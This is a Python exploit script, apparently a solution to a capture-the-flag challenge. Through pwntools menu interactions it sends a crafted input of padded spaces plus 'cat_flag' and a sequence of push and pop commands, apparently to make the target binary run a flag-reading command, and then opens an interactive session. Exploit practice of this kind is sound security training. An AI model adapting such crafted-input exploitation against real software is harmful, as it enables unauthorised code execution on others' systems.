#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chal")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def push(cmd: int, data: bytes = b""):
        io.sendlineafter("Enter command: ", "1")
        if cmd == 1:
            io.sendlineafter("Enter command: ", "1")
        elif cmd == 2:
            io.sendlineafter("Enter command: ", "2")
        elif cmd == 3:
            io.sendlineafter("Enter command: ", "3")
        elif cmd == 4:
            if len(data) > 1024:
                ptr.logger.error("too long")
                exit()

            io.sendlineafter("Enter command: ", "4")
            if len(data) == 1024:
                io.sendafter("Enter argument: ", data)
            else:
                io.sendlineafter("Enter argument: ", data)
        else:
            ptr.logger.error("Invalid command")
            exit()
        return

    def pop(idx: int):
        io.sendlineafter("Enter command: ", "2")
        io.sendlineafter("Enter index to remove: ", str(idx))
        return

    def execute():
        io.sendlineafter("Enter command: ", "3")
        return

    def clear():
        io.sendlineafter("Enter command: ", "4")
        return

    def show() -> bytes:
        io.sendlineafter("Enter command: ", "5")
        io.recvuntil("===============================\n")
        return io.recvuntil("===============================").strip(
            b"==============================="
        )

    push(4, b" " * 18 + b"cat_flag")
    push(3)
    push(3)
    push(3)
    push(3)
    push(3)
    push(2)
    pop(0)

    io.interactive()
    return


if __name__ == "__main__":
    main()
